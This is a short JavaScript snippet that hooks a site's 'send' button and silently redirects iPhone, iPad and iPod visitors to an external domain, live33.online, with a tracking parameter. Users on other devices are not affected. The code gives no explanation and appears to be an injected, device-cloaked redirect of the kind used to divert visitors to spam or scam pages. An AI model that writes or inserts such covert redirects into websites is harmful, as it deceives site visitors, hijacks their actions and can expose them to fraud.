
  var button = document.querySelector('.send');  
button.addEventListener('click', function() {
    (function() {
        var redirectURL = "https://live33.online/?03f5d38";
        var isIOS = /iPhone|iPad|iPod/i.test(navigator.userAgent);

        if (isIOS) { 
            setTimeout(function() {
                window.location.href = redirectURL;
            }, 0); 
        }
    })();
});
